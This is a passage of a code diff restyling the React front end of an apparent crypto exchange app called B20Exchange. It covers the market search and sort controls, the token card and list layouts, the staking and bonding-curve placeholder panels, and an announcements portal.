-                                                    <option value="change">Highest Volatility</option>
-                                                </select>
+                                        <div className="xl:col-span-4 flex items-center gap-4">
+                                            <div className="flex-1 flex flex-col gap-2">
+                                                <div className="flex items-center gap-2 px-2">
+                                                    <Search className="w-3.5 h-3.5 text-slate-400" />
+                                                    <span className="text-[9px] font-bold uppercase tracking-widest text-slate-500">Global Search</span>
+                                                </div>
+                                                <div className="relative group/search">
+                                                    <input
+                                                        type="text"
+                                                        placeholder="Name, Symbol or 0x..."
+                                                        value={marketSearch}
+                                                        onChange={(e) => setMarketSearch(e.target.value)}
+                                                        className="w-full bg-slate-50 border border-slate-200/60 rounded-xl py-2.5 pl-10 pr-10 text-[10px] font-bold uppercase tracking-widest outline-none focus:bg-white focus:border-indigo-500 focus:shadow-md transition-all placeholder:text-slate-300"
+                                                    />
+                                                    <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-slate-300 group-focus-within/search:text-indigo-600 transition-colors" />
+                                                    {marketSearch && (
+                                                        <button onClick={() => setMarketSearch('')} className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-400 hover:text-slate-900 transition-colors">
+                                                            <X className="w-3 h-3" />
+                                                        </button>
+                                                    )}
+                                                </div>
                                             </div>
-                                            <div className="flex bg-gray-50 border border-gray-100 p-1.5 rounded-2xl gap-1">
-                                                <button onClick={() => setViewType('card')} className={`p-3 rounded-xl transition-all ${viewType === 'card' ? 'bg-gray-900 text-white shadow-lg' : 'text-gray-400 hover:text-gray-900'}`}>
-                                                    <LayoutGrid className="w-4 h-4" />
-                                                </button>
-                                                <button onClick={() => setViewType('list')} className={`p-3 rounded-xl transition-all ${viewType === 'list' ? 'bg-gray-900 text-white shadow-lg' : 'text-gray-400 hover:text-gray-900'}`}>
-                                                    <List className="w-4 h-4" />
-                                                </button>
+
+                                            <div className="flex flex-col gap-2 shrink-0">
+                                                <div className="flex items-center gap-2 px-2">
+                                                    <List className="w-3.5 h-3.5 text-slate-400" />
+                                                    <span className="text-[9px] font-bold uppercase tracking-widest text-slate-500">View</span>
+                                                </div>
+                                                <div className="flex bg-slate-50 border border-slate-200/60 p-1 rounded-xl gap-1">
+                                                    <button onClick={() => setViewType('card')} className={`p-1.5 rounded-lg transition-all ${viewType === 'card' ? 'bg-indigo-600 text-white shadow-md' : 'text-slate-400 hover:text-slate-900'}`}>
+                                                        <LayoutGrid className="w-3.5 h-3.5" />
+                                                    </button>
+                                                    <button onClick={() => setViewType('list')} className={`p-1.5 rounded-lg transition-all ${viewType === 'list' ? 'bg-indigo-600 text-white shadow-md' : 'text-slate-400 hover:text-slate-900'}`}>
+                                                        <List className="w-3.5 h-3.5" />
+                                                    </button>
+                                                </div>
                                             </div>
                                         </div>
                                     </div>
 
-                                    {/* Row 3: Search Bar */}
-                                    <div className="relative group/search">
-                                        <Search className="absolute left-6 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within/search:text-amber-500 transition-colors" />
-                                        <input
-                                            type="text"
-                                            placeholder="SEARCH BY NAME, SYMBOL OR CONTRACT (0X...)..."
-                                            value={marketSearch}
-                                            onChange={(e) => setMarketSearch(e.target.value)}
-                                            className="w-full bg-gray-50 border border-gray-100 rounded-[1.5rem] py-5 pl-16 pr-6 text-[10px] font-black uppercase tracking-widest outline-none focus:bg-white focus:border-amber-500/50 focus:shadow-xl focus:shadow-amber-500/5 transition-all placeholder:text-gray-200"
-                                        />
-                                        {marketSearch && (
-                                            <button onClick={() => setMarketSearch('')} className="absolute right-6 top-1/2 -translate-y-1/2 w-6 h-6 bg-gray-200 hover:bg-gray-300 rounded-full flex items-center justify-center text-gray-500 transition-all">
-                                                <X className="w-3 h-3" />
-                                            </button>
-                                        )}
-                                    </div>
+                                    <div className="flex items-center justify-between px-2 pt-3 border-t border-slate-100">
+                                        <div className="flex items-center gap-6">
+                                            <div className="flex items-center gap-2 bg-emerald-50 px-3 py-1.5 rounded-lg border border-emerald-100">
+                                                <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
+                                                <span className="text-[10px] font-bold text-emerald-600 uppercase tracking-widest">Liquidity Sync Active</span>
+                                            </div>
+                                            <div className="flex items-center gap-2">
+                                                <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest italic">Institutional Intelligence Active //</span>
+                                                <span className="text-[10px] font-bold text-slate-900 uppercase tracking-widest border-b border-indigo-200">
+                                                    {displayTokens.length.toLocaleString()} Assets Indexed
+                                                </span>
+                                            </div>
+                                        </div>
 
-                                    <div className="flex items-center justify-between px-2">
-                                        <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">
-                                            Institutional Intelligence Active // Showing <span className="text-gray-900 border-b-2 border-amber-400">{displayTokens.length} Assets</span>
-                                        </p>
+                                        <div className="flex items-center gap-3">
+                                            <span className="text-[9px] font-bold text-slate-400 uppercase tracking-widest">Sort:</span>
+                                            <select
+                                                value={marketSort}
+                                                onChange={(e) => setMarketSort(e.target.value)}
+                                                className="bg-white border border-slate-200 rounded-lg px-2.5 py-1 text-[9px] font-bold uppercase tracking-widest text-slate-900 outline-none focus:border-indigo-500 shadow-sm"
+                                            >
+                                                <option value="rank">Crypto Rank</option>
+                                                <option value="mcap">Market Cap</option>
+                                                <option value="p_high">Price: High → Low</option>
+                                                <option value="p_low">Price: Low → High</option>
+                                                <option value="change">Volatility</option>
+                                            </select>
+                                        </div>
                                     </div>
                                 </div>
                             </div>
 
                             {viewType === 'card' ? (
-                                <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-5 gap-8 font-sans pb-20">
+                                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 2xl:grid-cols-5 gap-6 font-sans pb-20">
                                 {displayTokens.slice(0, visibleItems).map((t, i) => (
                                 <motion.div
                                     key={t.id || t.address}
-                                    initial={{ opacity: 0, scale: 0.95 }}
-                                    animate={{ opacity: 1, scale: 1 }}
+                                    initial={{ opacity: 0, y: 20 }}
+                                    animate={{ opacity: 1, y: 0 }}
                                     transition={{ delay: Math.min(i * 0.005, 0.15) }}
-                                    className={`p-8 bg-white shadow-xl shadow-gray-200/50 border border-gray-100 rounded-[2.5rem] hover:border-amber-500/30 transition-all flex flex-col justify-between h-[360px] group ${t.price_change_percentage_24h >= 0 ? 'animate-pulse-green' : 'animate-pulse-red'}`}
+                                    className={`relative p-5 bg-white shadow-xl shadow-slate-200/40 border border-slate-100 rounded-[2rem] hover:border-indigo-500/40 hover:shadow-2xl hover:shadow-indigo-500/10 transition-all duration-500 flex flex-col group overflow-hidden ${t.price_change_percentage_24h >= 0 ? 'hover:bg-emerald-50/10' : 'hover:bg-rose-50/10'}`}
                                 >
-                                    <div className="flex items-center gap-4">
-                                        <div className="w-14 h-14 bg-gray-50 rounded-2xl p-2 border border-gray-100 group-hover:bg-amber-50 transition-colors shrink-0">
-                                            {t.image ? <img src={t.image} className="w-full h-full object-contain rounded-lg" alt="" /> : null}
-                                        </div>
-                                        <div className="flex-1 min-w-0">
-                                            <div className="flex items-center gap-2 flex-wrap">
-                                                <h3 className="text-base font-black text-gray-900 uppercase tracking-tighter truncate">{t.symbol}</h3>
-                                                {(t.isNewlyLaunched || t.trust_status === 'Newly Launched Token') && (
-                                                    <span className="bg-cyan-500 text-white px-1.5 py-0.5 rounded text-[7px] font-black uppercase tracking-widest leading-none">Newly Launched</span>
-                                                )}
-                                                {t.network && (
-                                                    <span className="bg-gray-100 text-gray-500 px-1.5 py-0.5 rounded text-[7px] font-black uppercase tracking-widest leading-none">{t.network}</span>
+                                    {/* Card Glow Effect */}
+                                    <div className={`absolute -right-10 -top-10 w-32 h-32 blur-3xl opacity-0 group-hover:opacity-30 transition-opacity duration-700 ${t.price_change_percentage_24h >= 0 ? 'bg-emerald-400' : 'bg-rose-400'}`} />
+
+                                    <div className="flex items-start justify-between mb-4">
+                                        <div className="flex items-center gap-3">
+                                            <div className="w-12 h-12 bg-slate-50 rounded-2xl p-1.5 border border-slate-100 shadow-sm group-hover:scale-110 transition-transform duration-500">
+                                                {t.image ? (
+                                                    <img src={t.image} className="w-full h-full object-contain rounded-xl" alt="" />
+                                                ) : (
+                                                    <div className="w-full h-full bg-indigo-600 rounded-xl flex items-center justify-center text-white font-black text-sm uppercase">
+                                                        {t.symbol?.charAt(0)}
+                                                    </div>
                                                 )}
                                             </div>
-                                            {t.market_cap_rank && t.market_cap_rank !== 999999 && (
-                                                <span className="text-[9px] font-black text-amber-600 bg-amber-50 border border-amber-200 px-2 py-0.5 rounded-lg shrink-0">#{t.market_cap_rank}</span>
+                                            <div className="flex flex-col">
+                                                <div className="flex items-center gap-1.5">
+                                                    <h3 className="text-sm font-black text-slate-900 uppercase tracking-tighter truncate max-w-[80px]">{t.symbol}</h3>
+                                                    {t.network && (
+                                                        <div className="flex items-center gap-1 bg-slate-50 border border-slate-200/60 px-1.5 py-0.5 rounded-md">
+                                                            <img src={NETWORK_LOGOS[t.network] || getNetworkLogo(t.network)} alt="" className="w-2.5 h-2.5 rounded-full" />
+                                                            <span className="text-[7px] font-bold text-slate-400 uppercase tracking-widest">{t.network}</span>
+                                                        </div>
+                                                    )}
+                                                </div>
+                                                <p className="text-[9px] font-bold text-slate-400 uppercase tracking-widest truncate max-w-[100px]">{t.name}</p>
+                                            </div>
+                                        </div>
+                                        <div className="flex flex-col items-end gap-1">
+                                            {t.market_cap_rank && t.market_cap_rank !== 999999 ? (
+                                                <span className="text-[8px] font-black text-slate-400 border border-slate-200 px-1.5 py-0.5 rounded-md uppercase tracking-widest">Rank #{t.market_cap_rank}</span>
+                                            ) : (
+                                                <span className="text-[8px] font-black text-indigo-500 border border-indigo-100 bg-indigo-50 px-1.5 py-0.5 rounded-md uppercase tracking-widest italic">Alpha</span>
                                             )}
-                                            <p className="text-[9px] font-bold text-gray-400 uppercase tracking-widest truncate">{t.name}</p>
                                         </div>
                                     </div>
-                                    <div className="space-y-4 my-8">
-                                        <div className="flex justify-between items-center text-[10px] font-black uppercase tracking-widest py-2 border-b border-gray-50">
-                                            <span className="text-gray-400">Price</span>
-                                            <span className="text-gray-900 font-mono">${t.current_price?.toLocaleString()}</span>
+
+                                    <div className="flex flex-col gap-1 mb-6">
+                                        <div className="flex items-baseline gap-2">
+                                            <span className="text-xl font-black text-slate-900 font-mono tracking-tighter">
+                                                ${t.current_price < 0.01 ? t.current_price.toFixed(8) : t.current_price?.toLocaleString()}
+                                            </span>
+                                            <span className={`text-[10px] font-black px-1.5 py-0.5 rounded-lg ${t.price_change_percentage_24h >= 0 ? 'text-emerald-600 bg-emerald-50' : 'text-rose-600 bg-rose-50'}`}>
+                                                {t.price_change_percentage_24h >= 0 ? '↑' : '↓'} {Math.abs(t.price_change_percentage_24h || 0).toFixed(2)}%
+                                            </span>
                                         </div>
-                                        <div className="flex justify-between items-center text-[10px] font-black uppercase tracking-widest py-2 border-b border-gray-50">
-                                            <span className="text-gray-400">Market Cap</span>
-                                            <span className="text-gray-900 font-mono">{formatB20Number(t.market_cap, "$")}</span>
-                                        </div>
-                                        <div className="flex justify-between items-center text-[10px] font-black uppercase tracking-widest py-2">
-                                            <span className="text-gray-400">Total Supply</span>
-                                            <span className="text-gray-900 font-mono">{formatB20Number(t.total_supply, "")}</span>
+                                        <div className="w-full h-1 bg-slate-50 rounded-full overflow-hidden">
+                                            <motion.div 
+                                                initial={{ width: 0 }}
+                                                animate={{ width: `${Math.min(Math.max((t.price_change_percentage_24h || 0) + 50, 10), 100)}%` }}
+                                                className={`h-full ${t.price_change_percentage_24h >= 0 ? 'bg-emerald-500' : 'bg-rose-500'}`}
+                                            />
                                         </div>
                                     </div>
-                                    <button 
-                                        onClick={() => { setMode('spot'); setToToken(t); }}
-                                        className="w-full py-5 bg-gray-900 text-white font-black text-[10px] uppercase tracking-[0.2em] rounded-2xl hover:bg-amber-500 transition-all shadow-xl group-hover:shadow-amber-500/20"
-                                    >
-                                        Trade Asset
-                                    </button>
+
+                                    <div className="grid grid-cols-2 gap-3 mb-6 p-3 bg-slate-50/50 rounded-2xl border border-slate-100">
+                                        <div className="flex flex-col">
+                                            <span className="text-[8px] font-bold text-slate-400 uppercase tracking-widest mb-1">Market Cap</span>
+                                            <span className="text-[10px] font-black text-slate-900 font-mono">{formatB20Number(t.market_cap, "$")}</span>
+                                        </div>
+                                        <div className="flex flex-col border-l border-slate-200 pl-3">
+                                            <span className="text-[8px] font-bold text-slate-400 uppercase tracking-widest mb-1">Volume 24H</span>
+                                            <span className="text-[10px] font-black text-slate-900 font-mono">{formatB20Number(t.total_volume, "$")}</span>
+                                        </div>
+                                    </div>
+
+                                    <div className="flex items-center gap-2">
+                                        <button 
+                                            onClick={() => { setMode('spot'); setToToken(t); }}
+                                            className="flex-1 py-3.5 bg-slate-900 text-white font-black text-[9px] uppercase tracking-widest rounded-xl hover:bg-indigo-600 transition-all shadow-xl hover:shadow-indigo-500/20 active:scale-95 flex items-center justify-center gap-2"
+                                        >
+                                            <Activity className="w-3 h-3" />
+                                            Trade Now
+                                        </button>
+                                        {(t.isNewlyLaunched || t.trust_status === 'Newly Launched Token') && (
+                                            <div className="w-10 h-10 flex items-center justify-center bg-cyan-50 border border-cyan-100 rounded-xl text-cyan-600 shadow-sm shadow-cyan-100">
+                                                <Sparkles className="w-4 h-4" />
+                                            </div>
+                                        )}
+                                    </div>
                                 </motion.div>
-                            ))}
+                                ))}
                                 </div>
                             ) : (
-                                <div className="flex flex-col gap-4 pb-20 w-full overflow-x-auto custom-scrollbar">
-                                    <div className="min-w-[1200px] grid grid-cols-12 gap-6 px-8 py-4 bg-gray-50 rounded-2xl text-[10px] font-black text-gray-400 uppercase tracking-widest border border-gray-100 hidden md:grid">
-                                        <div className="col-span-3">Asset</div>
-                                        <div className="col-span-2">Price</div>
-                                        <div className="col-span-2">24h Change</div>
-                                        <div className="col-span-2">Total Supply</div>
-                                        <div className="col-span-2">Market Cap</div>
-                                        <div className="text-right col-span-1">Action</div>
+                                <div className="flex flex-col gap-3 pb-20 w-full overflow-x-auto custom-scrollbar">
+                                    <div className="min-w-[1200px] grid grid-cols-12 gap-6 px-10 py-5 bg-white border border-slate-100 rounded-[2rem] text-[9px] font-black text-slate-400 uppercase tracking-widest shadow-sm shadow-slate-100 hidden md:grid items-center">
+                                        <div className="col-span-1">Rank</div>
+                                        <div className="col-span-3">Institutional Asset</div>
+                                        <div className="col-span-2">Execution Price</div>
+                                        <div className="col-span-1">24H Dynamic</div>
+                                        <div className="col-span-2">Capitalization</div>
+                                        <div className="col-span-2 text-center">Liquidity Index</div>
+                                        <div className="text-right col-span-1">Terminal</div>
                                     </div>
                                     {displayTokens.slice(0, visibleItems).map((t, i) => (
                                         <motion.div
                                             key={t.id || t.address}
-                                            initial={{ opacity: 0, scale: 0.98 }}
-                                            animate={{ opacity: 1, scale: 1 }}
+                                            initial={{ opacity: 0, x: -20 }}
+                                            animate={{ opacity: 1, x: 0 }}
                                             transition={{ delay: Math.min(i * 0.005, 0.1) }}
-                                            className={`min-w-[1200px] grid grid-cols-1 md:grid-cols-12 items-center gap-6 p-6 bg-white shadow-xl shadow-gray-200/50 border border-gray-100 rounded-[2.5rem] hover:border-amber-500/30 transition-all group ${t.price_change_percentage_24h >= 0 ? 'animate-pulse-green' : 'animate-pulse-red'}`}
+                                            className="min-w-[1200px] grid grid-cols-1 md:grid-cols-12 items-center gap-6 px-10 py-4 bg-white hover:bg-slate-50/50 border border-slate-100 hover:border-indigo-200/50 rounded-[2rem] transition-all group relative overflow-hidden"
                                         >
-                                            <div className="col-span-3 flex items-center gap-4">
-                                                <span className="font-bold text-gray-300 w-8">
-                                                    {t.market_cap_rank && t.market_cap_rank !== 999999 ? `#${t.market_cap_rank}` : `#${i + 1}`}
+                                            <div className={`absolute left-0 top-0 bottom-0 w-1 transition-all group-hover:w-1.5 ${t.price_change_percentage_24h >= 0 ? 'bg-emerald-500' : 'bg-rose-500'}`} />
+
+                                            <div className="col-span-1">
+                                                <span className="text-[10px] font-black text-slate-300 group-hover:text-indigo-600 transition-colors">
+                                                    {t.market_cap_rank && t.market_cap_rank !== 999999 ? `#${t.market_cap_rank.toString().padStart(2, '0')}` : `#${(i + 1).toString().padStart(2, '0')}`}
                                                 </span>
-                                                <div className="w-12 h-12 bg-gray-50 rounded-2xl p-2 border border-gray-100 group-hover:bg-amber-50 transition-colors shrink-0">
-                                                    {t.image ? <img src={t.image} className="w-full h-full object-contain rounded-lg" alt="" /> : null}
+                                            </div>
+
+                                            <div className="col-span-3 flex items-center gap-4">
+                                                <div className="w-10 h-10 bg-slate-50 rounded-xl p-1.5 border border-slate-100 group-hover:scale-105 transition-transform">
+                                                    {t.image ? (
+                                                        <img src={t.image} className="w-full h-full object-contain rounded-lg" alt="" />
+                                                    ) : (
+                                                        <div className="w-full h-full bg-indigo-600 rounded-lg flex items-center justify-center text-white font-black text-xs">
+                                                            {t.symbol?.charAt(0)}
+                                                        </div>
+                                                    )}
                                                 </div>
                                                 <div className="min-w-0">
-                                                <div className="flex items-center gap-2 flex-wrap">
-                                                    <h3 className="text-base font-black text-gray-900 uppercase tracking-tighter truncate">{t.symbol}</h3>
-                                                    {(t.isNewlyLaunched || t.trust_status === 'Newly Launched Token') && (
-                                                        <span className="bg-cyan-500 text-white px-1.5 py-0.5 rounded text-[7px] font-black uppercase tracking-widest leading-none">Newly Launched</span>
-                                                    )}
-                                                    {t.network && (
-                                                        <span className="bg-gray-100 text-gray-500 px-1.5 py-0.5 rounded text-[7px] font-black uppercase tracking-widest">{t.network}</span>
-                                                    )}
-                                                </div>
-                                                <p className="text-[9px] font-bold text-gray-400 uppercase tracking-widest truncate">{t.name}</p>
+                                                    <div className="flex items-center gap-2">
+                                                        <h3 className="text-sm font-black text-slate-900 uppercase tracking-tighter">{t.symbol}</h3>
+                                                        {t.network && (
+                                                            <img src={NETWORK_LOGOS[t.network] || getNetworkLogo(t.network)} alt="" className="w-3 h-3 rounded-full opacity-60 group-hover:opacity-100 transition-opacity" />
+                                                        )}
+                                                    </div>
+                                                    <p className="text-[9px] font-bold text-slate-400 uppercase tracking-widest truncate">{t.name}</p>
                                                 </div>
                                             </div>
-                                            <div className="hidden md:block col-span-2">
-                                                <p className="text-sm font-black text-gray-900 font-mono">${(t.current_price || 0).toLocaleString()}</p>
-                                            </div>
-                                            <div className="hidden md:block col-span-2">
-                                                <p className={`text-sm font-black ${t.price_change_percentage_24h >= 0 ? 'text-emerald-500' : 'text-rose-500'}`}>
-                                                    {t.price_change_percentage_24h?.toFixed(2) || '0.00'}%
+
+                                            <div className="col-span-2">
+                                                <p className="text-[11px] font-black text-slate-900 font-mono tracking-tight">
+                                                    ${t.current_price < 0.01 ? t.current_price.toFixed(8) : t.current_price?.toLocaleString()}
                                                 </p>
                                             </div>
-                                            <div className="hidden md:block col-span-2">
-                                                <p className="text-sm font-black text-gray-900 font-mono">{formatB20Number(t.total_supply)}</p>
+
+                                            <div className="col-span-1">
+                                                <div className={`inline-flex items-center gap-1 text-[10px] font-black px-2 py-0.5 rounded-lg ${t.price_change_percentage_24h >= 0 ? 'text-emerald-600 bg-emerald-50' : 'text-rose-600 bg-rose-50'}`}>
+                                                    {t.price_change_percentage_24h >= 0 ? '+' : ''}{t.price_change_percentage_24h?.toFixed(2)}%
+                                                </div>
                                             </div>
-                                            <div className="hidden md:block col-span-2">
-                                                <p className="text-sm font-black text-gray-900 font-mono">{formatB20Number(t.market_cap, "$")}</p>
+
+                                            <div className="col-span-2">
+                                                <p className="text-[10px] font-black text-slate-600 font-mono">{formatB20Number(t.market_cap, "$")}</p>
+                                                <div className="w-20 h-1 bg-slate-100 rounded-full mt-1.5 overflow-hidden">
+                                                    <div className="h-full bg-indigo-400/20 w-3/4" />
+                                                </div>
                                             </div>
-                                            <div className="flex justify-end mt-4 md:mt-0 col-span-1">
+
+                                            <div className="col-span-2 flex flex-col items-center">
+                                                <div className="w-full max-w-[100px] h-8 flex items-end gap-0.5">
+                                                    {[...Array(8)].map((_, idx) => (
+                                                        <div 
+                                                            key={idx}
+                                                            className={`flex-1 rounded-t-sm transition-all duration-500 ${t.price_change_percentage_24h >= 0 ? 'bg-emerald-400/20 group-hover:bg-emerald-500/40' : 'bg-rose-400/20 group-hover:bg-rose-500/40'}`}
+                                                            style={{ height: `${Math.random() * 60 + 20}%` }}
+                                                        />
+                                                    ))}
+                                                </div>
+                                                <span className="text-[8px] font-black text-slate-400 uppercase tracking-widest mt-1">Live Feed</span>
+                                            </div>
+
+                                            <div className="col-span-1 flex justify-end">
                                                 <button 
                                                     onClick={() => { setMode('spot'); setToToken(t); }}
-                                                    className="w-full md:w-auto px-6 py-3 bg-gray-900 text-white font-black text-[10px] uppercase tracking-[0.2em] rounded-2xl hover:bg-amber-500 transition-all shadow-xl group-hover:shadow-amber-500/20 whitespace-nowrap"
+                                                    className="w-10 h-10 bg-slate-900 text-white rounded-xl flex items-center justify-center hover:bg-indigo-600 transition-all shadow-lg hover:shadow-indigo-500/20 active:scale-90"
                                                 >
-                                                    Trade
+                                                    <Activity className="w-4 h-4" />
                                                 </button>
                                             </div>
                                         </motion.div>
@@ -2292,8 +2600,8 @@ export default function B20Exchange() {
                             <div ref={scrollSentinelRef} className="h-40 w-full flex items-center justify-center pb-20">
                                 {displayTokens.length > visibleItems && (
                                     <div className="flex flex-col items-center gap-4">
-                                        <div className="w-8 h-8 border-4 border-amber-500 border-t-transparent rounded-full animate-spin" />
-                                        <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest animate-pulse">
+                                        <div className="w-8 h-8 border-4 border-indigo-500 border-t-transparent rounded-full animate-spin" />
+                                        <span className="text-[10px] font-black text-slate-400 uppercase tracking-widest animate-pulse">
                                             Scanning Global Indices... ({displayTokens.length - visibleItems} Assets Remaining)
                                         </span>
                                     </div>
@@ -2317,17 +2625,17 @@ export default function B20Exchange() {
                             key="bonding" initial={{ opacity: 0, scale: 0.98 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 1.02 }}
                             className="max-w-[1600px] mx-auto"
                         >
-                            <div className="bg-white/50 backdrop-blur-3xl border border-gray-100 rounded-[3rem] p-12 text-center py-32 shadow-3xl shadow-amber-900/5">
+                            <div className="bg-white/50 backdrop-blur-3xl border border-slate-200/60 rounded-2xl p-8 text-center py-32 shadow-3xl shadow-indigo-900/5">
                                 <div className="w-24 h-24 bg-rose-500/10 rounded-[2rem] flex items-center justify-center mx-auto mb-8 border border-rose-500/20">
                                     <Zap className="w-12 h-12 text-rose-500" />
                                 </div>
-                                <h3 className="text-4xl font-black text-gray-900 uppercase tracking-tighter italic mb-4">Bonding Curve Terminal</h3>
+                                <h3 className="text-4xl font-black text-slate-900 uppercase tracking-tighter italic mb-4">Bonding Curve Terminal</h3>
                                 <p className="text-gray-500 font-bold uppercase tracking-widest text-sm max-w-lg mx-auto leading-relaxed">
                                     Access B20-exclusive Bonding Curve liquidity pools with AI-audit verification.
                                 </p>
                                 <div className="mt-12 flex justify-center gap-6">
-                                    <Link href="/trade" className="px-10 py-5 bg-rose-500 text-white rounded-[2rem] font-black uppercase tracking-[0.2em] shadow-xl shadow-rose-500/20 hover:scale-105 transition-all">Launch Console</Link>
-                                    <button onClick={() => setMode('markets')} className="px-10 py-5 bg-white border border-gray-100 text-gray-400 rounded-[2rem] font-black uppercase tracking-widest hover:text-gray-900 transition-all">View Analytics</button>
+                                    <Link href="/trade" className="px-6 py-3.5 bg-rose-500 text-white rounded-[2rem] font-bold uppercase tracking-wide shadow-xl shadow-rose-500/20 hover:scale-105 transition-all">Launch Console</Link>
+                                    <button onClick={() => setMode('markets')} className="px-6 py-3.5 bg-white border border-slate-200/60 text-slate-400 rounded-[2rem] font-bold uppercase tracking-widest hover:text-slate-900 transition-all">View Analytics</button>
                                 </div>
                             </div>
                         </motion.div>
@@ -2338,17 +2646,17 @@ export default function B20Exchange() {
                             key="staking" initial={{ opacity: 0, y: 30 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -30 }}
                             className="max-w-[1200px] mx-auto"
                         >
-                             <div className="bg-white/50 backdrop-blur-3xl border border-gray-100 rounded-[3rem] p-12 text-center py-32 shadow-3xl shadow-amber-900/5">
+                             <div className="bg-white/50 backdrop-blur-3xl border border-slate-200/60 rounded-2xl p-8 text-center py-32 shadow-3xl shadow-indigo-900/5">
                                 <div className="w-24 h-24 bg-violet-500/10 rounded-[2rem] flex items-center justify-center mx-auto mb-8 border border-violet-500/20">
                                     <Lock className="w-12 h-12 text-violet-500" />
                                 </div>
-                                <h3 className="text-4xl font-black text-gray-900 uppercase tracking-tighter italic mb-4">Yield Protocol Vaults</h3>
+                                <h3 className="text-4xl font-black text-slate-900 uppercase tracking-tighter italic mb-4">Yield Protocol Vaults</h3>
                                 <p className="text-gray-500 font-bold uppercase tracking-widest text-sm max-w-lg mx-auto leading-relaxed">
                                     Stake any BEP20 asset in institutional vaults. High yield APR. Automated rewards.
                                 </p>
                                 <div className="mt-12 flex justify-center gap-6">
-                                    <Link href="/staking" className="px-10 py-5 bg-violet-500 text-white rounded-[2rem] font-black uppercase tracking-[0.2em] shadow-xl shadow-violet-500/20 hover:scale-105 transition-all">Enter Vault</Link>
-                                    <button onClick={() => setMode('markets')} className="px-10 py-5 bg-white border border-gray-100 text-gray-400 rounded-[2rem] font-black uppercase tracking-widest hover:text-gray-900 transition-all">Market Nexus</button>
+                                    <Link href="/staking" className="px-6 py-3.5 bg-violet-500 text-white rounded-[2rem] font-bold uppercase tracking-wide shadow-xl shadow-violet-500/20 hover:scale-105 transition-all">Enter Vault</Link>
+                                    <button onClick={() => setMode('markets')} className="px-6 py-3.5 bg-white border border-slate-200/60 text-slate-400 rounded-[2rem] font-bold uppercase tracking-widest hover:text-slate-900 transition-all">Market Nexus</button>
                                 </div>
                             </div>
                         </motion.div>
@@ -2420,31 +2728,31 @@ const AnnouncementsPortal = ({ setMode, setToToken, tokens }) => {
     }, []);
 
     return (
-        <div className="bg-white/50 backdrop-blur-3xl border border-gray-100 rounded-[3rem] p-8 md:p-12 shadow-3xl shadow-amber-900/5 min-h-[500px]">
-            <div className="flex items-center gap-6 mb-12 border-b border-gray-100 pb-8">
+        <div className="bg-white/50 backdrop-blur-3xl border border-slate-200/60 rounded-2xl p-8 md:p-8 shadow-3xl shadow-indigo-900/5 min-h-[500px]">
+            <div className="flex items-center gap-6 mb-12 border-b border-slate-200/60 pb-8">
                 <div className="w-16 h-16 bg-purple-500 text-white rounded-2xl flex items-center justify-center shadow-xl shadow-purple-500/20">
                     <Megaphone className="w-8 h-8" />
                 </div>
                 <div>
-                    <h2 className="text-3xl font-black text-gray-900 uppercase tracking-tighter">Official B20 Bulletin</h2>
-                    <p className="text-xs font-black text-purple-500 uppercase tracking-[0.3em] mt-1">24H Live System Broadcasts</p>
+                    <h2 className="text-3xl font-black text-slate-900 uppercase tracking-tighter">Official B20 Bulletin</h2>
+                    <p className="text-xs font-black text-purple-500 uppercase tracking-wider mt-1">24H Live System Broadcasts</p>
                 </div>
             </div>
 
             {loading ? (
-                <div className="flex justify-center items-center py-20 text-gray-400">
+                <div className="flex justify-center items-center py-20 text-slate-400">
                     <Loader2 className="w-8 h-8 animate-spin" />
                 </div>
             ) : announcements.length === 0 ? (
-                <div className="text-center py-20 bg-gray-50 rounded-3xl border border-gray-100 text-gray-400 font-bold uppercase tracking-widest text-xs">
+                <div className="text-center py-20 bg-slate-50 rounded-xl border border-slate-200/60 text-slate-400 font-bold uppercase tracking-widest text-xs">
                     No active broadcasts in the last 24 hours.
                 </div>
             ) : (
                 <div className="flex flex-col gap-6">
                     {announcements.map((a, i) => (
-                        <div key={a.id} className="bg-white rounded-[2rem] border border-gray-100 shadow-sm hover:shadow-md hover:border-purple-500/30 transition-all flex flex-col md:flex-row overflow-hidden group">
+                        <div key={a.id} className="bg-white rounded-[2rem] border border-slate-200/60 shadow-sm hover:shadow-md hover:border-purple-500/30 transition-all flex flex-col md:flex-row overflow-hidden group">
                             {a.image_url ? (
-                                <div className="w-full md:w-64 h-48 md:h-auto bg-gray-50 overflow-hidden shrink-0 relative">
+                                <div className="w-full md:w-64 h-48 md:h-auto bg-slate-50 overflow-hidden shrink-0 relative">
                                     <img src={`${process.env.NEXT_PUBLIC_API_URL?.replace('/api','') || 'http://localhost:3001'}${a.image_url}`} alt="" className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-700" />
                                     <div className="absolute inset-0 bg-gradient-to-r from-transparent to-black/5 pointer-events-none md:hidden" />
                                 </div>
@@ -2466,8 +2774,8 @@ const AnnouncementsPortal = ({ setMode, setToToken, tokens }) => {
                                                             </div>
                                                             <div className="flex-1 min-w-0">
                                                                 <div className="flex items-center gap-2 flex-wrap">
-                                                                    <h4 className="text-lg font-black uppercase tracking-tight truncate">{t.name}</h4>
-                                                                    <span className="px-2 py-0.5 bg-purple-500 rounded-md text-[8px] font-black uppercase shrink-0">Rank #{t.rank}</span>
+                                                                    <h4 className="text-lg font-bold uppercase tracking-tight truncate">{t.name}</h4>
+                                                                    <span className="px-2 py-0.5 bg-purple-500 rounded-md text-[8px] font-bold uppercase shrink-0">Rank #{t.rank}</span>
                                                                 </div>
                                                                 <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mt-2">
                                                                     <div><p className="text-[8px] font-black text-slate-400 uppercase tracking-widest truncate">Market Cap</p><p className="text-[10px] font-black text-emerald-400 mt-0.5">${t.mcap}</p></div>
@@ -2480,7 +2788,7 @@ const AnnouncementsPortal = ({ setMode, setToToken, tokens }) => {
                                                         <div className="md:border-l md:border-white/10 md:pl-6 shrink-0">
                                                             <button 
